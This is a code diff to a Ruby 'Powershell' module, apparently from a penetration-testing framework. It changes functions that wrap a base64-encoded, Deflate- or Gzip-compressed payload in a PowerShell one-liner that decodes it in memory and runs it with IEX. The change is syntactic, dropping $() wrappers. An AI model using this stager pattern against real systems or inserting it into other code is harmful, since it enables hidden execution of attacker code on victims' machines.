@@ -43,17 +43,17 @@ module Powershell
       # Build the powershell expression
       # Decode base64 encoded command and create a stream object
       psh_expression =  "$s=New-Object IO.MemoryStream(,"
-      psh_expression << "$([Convert]::FromBase64String('#{encoded_stream}')));"
+      psh_expression << "[Convert]::FromBase64String('#{encoded_stream}'));"
       # Read & delete the first two bytes due to incompatibility with MS
       psh_expression << "$s.ReadByte();"
       psh_expression << "$s.ReadByte();"
       # Uncompress and invoke the expression (execute)
-      psh_expression << "$(IEX $(New-Object IO.StreamReader("
-      psh_expression << "$(New-Object IO.Compression.DeflateStream("
+      psh_expression << "IEX (New-Object IO.StreamReader("
+      psh_expression << "New-Object IO.Compression.DeflateStream("
       psh_expression << "$s,"
       # [IO.Compression.CompressionMode]::Decompress = 0
-      psh_expression << "0))"
-      psh_expression << ")).ReadToEnd());"
+      psh_expression << "0)"
+      psh_expression << ")).ReadToEnd();"
 
       # If eof is set, add a marker to signify end of code output
       #if (eof && eof.length == 8) then psh_expression += "'#{eof}'" end
@@ -83,14 +83,14 @@ module Powershell
       # Build the powershell expression
       # Decode base64 encoded command and create a stream object
       psh_expression =  "$s=New-Object IO.MemoryStream(,"
-      psh_expression << "$([Convert]::FromBase64String('#{encoded_stream}')));"
+      psh_expression << "[Convert]::FromBase64String('#{encoded_stream}'));"
       # Uncompress and invoke the expression (execute)
-      psh_expression << "$(IEX $(New-Object IO.StreamReader("
-      psh_expression << "$(New-Object IO.Compression.GzipStream("
+      psh_expression << "IEX (New-Object IO.StreamReader("
+      psh_expression << "New-Object IO.Compression.GzipStream("
       psh_expression << "$s,"
       # [IO.Compression.CompressionMode]::Decompress = 0
-      psh_expression << "0))"
-      psh_expression << ")).ReadToEnd());"
+      psh_expression << "0)"
+      psh_expression << ")).ReadToEnd();"
 
       # If eof is set, add a marker to signify end of code output
       #if (eof && eof.length == 8) then psh_expression += "'#{eof}'" end
